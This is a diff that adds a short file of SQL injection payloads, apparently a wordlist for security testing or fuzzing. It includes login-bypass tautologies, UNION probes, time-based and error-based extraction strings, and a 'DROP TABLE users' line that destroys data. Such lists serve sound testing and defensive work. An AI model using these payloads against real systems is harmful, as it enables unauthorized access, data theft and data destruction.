@@ -1,0 +1,10 @@
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+1' UNION SELECT NULL--
+1" UNION SELECT NULL--
+'; DROP TABLE users--
+1 AND 1=CONVERT(int,@@version)--
+' WAITFOR DELAY '0:0:5'--
+1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
